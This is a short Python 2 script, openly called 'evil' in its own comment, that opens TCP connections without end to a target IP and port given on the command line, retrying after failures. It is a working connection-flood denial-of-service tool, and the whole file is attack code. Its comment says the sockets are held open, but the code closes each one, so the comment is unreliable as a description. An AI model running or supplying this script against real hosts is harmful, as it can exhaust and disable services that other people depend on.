#!/usr/bin/env python2
# This script simply opens as many sockets as it can, keeps them open and does not send any data.
# Neat and evil!

import socket
import sys
import time
import traceback

target_ip = sys.argv[1]
target_port = int(sys.argv[2])

i = 0
local_port = 61000
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.bind(('0.0.0.0', local_port))
        s.connect((target_ip, target_port))
#        s.send('a') #anything will do
        i += 1
        local_port += 1
        if local_port > 62000:
            local_port = 61000
        print 'Socket %d' % i
        s.close()
        #time.sleep(0.01)

    except Exception:
        traceback.print_stack()
        print '--------------'
        traceback.print_exc()
        print 'Could not create socket %d, local port %d' % (i, local_port)
        time.sleep(0.5)
